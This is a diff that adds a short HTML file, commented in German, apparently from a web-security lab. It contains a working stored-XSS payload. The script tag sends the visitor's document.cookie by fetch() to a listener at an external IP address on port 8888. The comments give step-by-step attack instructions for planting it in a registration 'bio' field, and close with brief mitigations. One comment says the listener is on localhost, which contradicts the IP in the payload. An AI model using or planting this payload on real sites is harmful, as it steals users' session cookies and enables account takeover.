@@ -1,0 +1,25 @@
+<!--
+XSS Cookie Stealer - Basic Stored XSS Payload (Bio-Feld)
+Verwendung: Beim Registrieren in das Bio-Feld kopieren
+-->
+
+<script>fetch('http://141.87.56.31:8888/steal?c='+encodeURIComponent(document.cookie))</script>
+
+<!--
+Erklärung:
+- <script> Tag wird direkt ausgeführt
+- fetch() sendet Cookie an lokalen Server
+- encodeURIComponent() kodiert Cookie für URL-Übertragung
+- Server läuft auf localhost:8888
+
+Angriffsszenario:
+1. Cookie-Stealer Server starten: python server.py
+2. Neuen Account registrieren mit diesem Payload im Bio-Feld
+3. Als Opfer einloggen und /users Seite besuchen
+4. Cookie wird automatisch an Angreifer-Server gesendet
+
+Mitigation:
+- Output Encoding: {{ u.bio | e }}
+- Content Security Policy (CSP)
+- HTTPOnly Cookie Flag
+-->
